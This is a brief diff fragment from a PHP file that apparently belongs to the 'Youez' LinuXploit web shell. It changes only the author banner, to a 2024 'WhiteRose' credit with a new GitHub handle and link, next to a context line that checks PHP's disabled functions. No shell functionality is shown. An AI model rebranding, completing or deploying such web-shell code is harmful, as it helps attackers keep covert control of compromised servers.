@@ -26,7 +26,7 @@ if (empty(@ini_get("disable_functions"))) {
 }
 
 function author() {
-    echo "<center><br>Youez - 2016 - github.com/yon3zu<br><a href='https://linuxploit.com/' target='_blank'>LinuXploit</a></center>";
+    echo "<center><br>RC1 - 2024 - github.com/whiterose7777<br><a href='https://linux.org/' target='_blank'>WhiteRose</a></center>";
     die();
 }
 
